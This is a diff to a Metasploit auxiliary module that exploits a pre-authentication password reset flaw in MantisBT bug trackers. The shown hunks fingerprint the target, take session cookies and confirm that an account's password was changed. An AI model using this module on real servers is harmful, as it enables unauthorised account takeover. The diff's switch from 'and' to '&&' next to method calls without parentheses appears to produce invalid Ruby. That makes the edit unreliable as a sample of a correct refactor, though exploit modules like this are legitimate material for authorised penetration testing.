@@ -26,7 +26,7 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'http://hyp3rlinx.altervista.org/advisories/MANTIS-BUG-TRACKER-PRE-AUTH-REMOTE-PASSWORD-RESET.txt']
         ],
       'Platform'     => ['win', 'linux'],
-      'DisclosureDate' => "Apr 16, 2017"))
+      'DisclosureDate' => "Apr 16 2017"))
 
       register_options(
         [
@@ -44,7 +44,7 @@ class MetasploitModule < Msf::Auxiliary
         'method'=>'GET'
       })
 
-      if res and res.body and res.body.include? 'Powered by <a href="http://www.mantisbt.org" title="bug tracking software">MantisBT'
+      if res && res.body && res.body.include? 'Powered by <a href="http://www.mantisbt.org" title="bug tracking software">MantisBT'
         vprint_status("MantisBT detected")
         return Exploit::CheckCode::Detected
       else
@@ -68,8 +68,8 @@ class MetasploitModule < Msf::Auxiliary
       }
     })
 
-    if !res or !res.body
-      fail_with(Failure::UnexpectedReply, "Error in server resonse. Ensure the server IP is correct.")
+    if !res || !res.body
+      fail_with(Failure::UnexpectedReply, "Error in server response. Ensure the server IP is correct.")
     end
 
     cookie = res.get_cookies
@@ -104,10 +104,10 @@ class MetasploitModule < Msf::Auxiliary
       'cookie' => cookie
     })
 
-    if res and res.body and res.body.include? 'Password successfully updated'
+    if res && res.body && res.body.include? 'Password successfully updated'
       print_good("Password successfully changed to '#{password}'.")
     else
-      fail_with(Failure::UnexpectedReply, 'Something went wrong, the password was not changed')
+      fail_with(Failure::UnexpectedReply, 'Something went wrong, the password was not changed.')
     end
   end
 end
